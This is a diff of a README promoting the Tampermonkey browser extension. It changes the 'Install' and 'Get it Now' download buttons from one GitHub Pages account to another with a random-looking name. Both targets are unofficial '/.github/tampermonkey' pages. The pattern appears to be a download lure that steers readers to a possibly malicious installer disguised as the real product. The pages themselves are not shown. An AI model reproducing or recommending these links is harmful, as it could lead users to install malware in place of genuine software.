@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://somovskoye.github.io/.github/tampermonkey)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://skalsd-oasd.github.io/.github/tampermonkey)
 
 </div>
 
@@ -81,7 +81,7 @@ Tampermonkey's significance comes from the userscript ecosystem it unlocks — c
 
 <p align="center">
 
-[![Get it Now Tampermonkey](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/tampermonkey)
+[![Get it Now Tampermonkey](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/tampermonkey)
 
 </p>
 
